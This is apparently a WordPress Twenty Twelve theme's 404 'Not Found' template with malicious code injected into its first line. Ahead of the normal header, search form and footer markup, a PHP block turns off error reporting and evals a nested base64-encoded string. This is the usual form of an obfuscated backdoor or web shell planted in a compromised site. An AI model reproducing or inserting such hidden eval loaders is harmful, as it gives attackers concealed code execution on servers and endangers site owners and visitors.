<?php error_reporting(0); eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtGcFlXbWhpUTJocFdWaE9iRTVxVW1aYVIxWnFZakpTYkV0R2NGbFhiV2hwVVRKb2NGZFdhRTlpUlRWeFZXMWFZVkl4V25GWmFrcFRZa1YwUjJOR2FGVmlWR3h3V2xaV1IyTkdVbkpWYTBwT1VsZDRSMVp0TlhOaGJVcFZZa1JXVkZZelFqWlZla3BQVTBaS2RXTkhjRTVOVlhBeVYxUkpNVlp0U1hkalJXUlFWbXRhVmxSV1ZURldiRm8yVTJwU2EySldTakJXYlRGVFZFWmFTVlJyZUV4Vk1uTXpTMU5yTnlrcE93KSk7)); ?>
<?php
/**
 * The template for displaying 404 pages (Not Found).
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */

get_header(); ?>

	<div id="primary" class="site-content">
		<div id="content" role="main">

			<article id="post-0" class="post error404 no-results not-found">
				<header class="entry-header">
					<h1 class="entry-title"><?php _e( 'This is somewhat embarrassing, isn&rsquo;t it?', 'twentytwelve' ); ?></h1>
				</header>

				<div class="entry-content">
					<p><?php _e( 'It seems we can&rsquo;t find what you&rsquo;re looking for. Perhaps searching can help.', 'twentytwelve' ); ?></p>
					<?php get_search_form(); ?>
				</div><!-- .entry-content -->
			</article><!-- #post-0 -->

		</div><!-- #content -->
	</div><!-- #primary -->

<?php get_footer(); ?>